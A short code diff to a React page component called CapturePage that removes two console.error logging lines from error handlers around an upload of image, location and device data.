@@ -26,7 +26,6 @@ export default function CapturePage() {
       await uploadData(imageBlob, locData, deviceInfo);
       setMessage("✅ Verified. Thank you!");
     } catch (error) {
-      console.error("Capture Error:", error);
       setMessage(`Error: ${error.message}`);
       setShowButton(true);
     } finally {
@@ -93,7 +92,6 @@ export default function CapturePage() {
 
       setMessage("✅ Verified. Thank you!");
     } catch (error) {
-      console.error("Upload Error:", error);
       setMessage(`Upload Error: ${error.message}`);
     }
   };
